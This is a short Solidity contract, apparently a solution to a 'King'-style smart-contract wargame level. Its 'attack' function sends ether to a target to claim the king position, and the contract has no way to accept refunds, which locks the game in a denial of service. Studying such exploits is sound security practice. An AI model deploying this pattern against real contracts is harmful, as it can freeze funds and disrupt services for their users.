// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CallKing {
    address payable public king;

    constructor(address payable _king) {
        king = _king;
    }

    function attack() external payable {
        (bool sent, ) = king.call{value: msg.value}("");
        require(sent, "failed");
    }
}